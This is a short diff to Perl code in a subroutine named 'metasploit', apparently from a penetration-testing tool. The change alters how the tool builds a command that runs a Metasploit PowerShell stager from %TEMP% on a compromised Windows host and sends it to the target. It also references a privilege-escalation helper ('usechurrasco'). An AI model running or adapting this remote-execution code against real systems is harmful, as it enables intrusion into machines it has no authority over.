@@ -247,8 +247,9 @@ sub metasploit
 				  $cmd = usechurrasco($cmd);
 			}
 		} else {
-			$cmd = "powershell.exe -noexit -file %TEMP%\\".$stager;
+			$cmd = "powershell.exe ".$conf->{'ps1params'}." -file %TEMP%\\".$stager;
 		}
+		print_verbose("Remotely running: ".$cmd."\n");
 		$command = createcommand($cmd);
 		sendrequest($command);
 		exit(0);
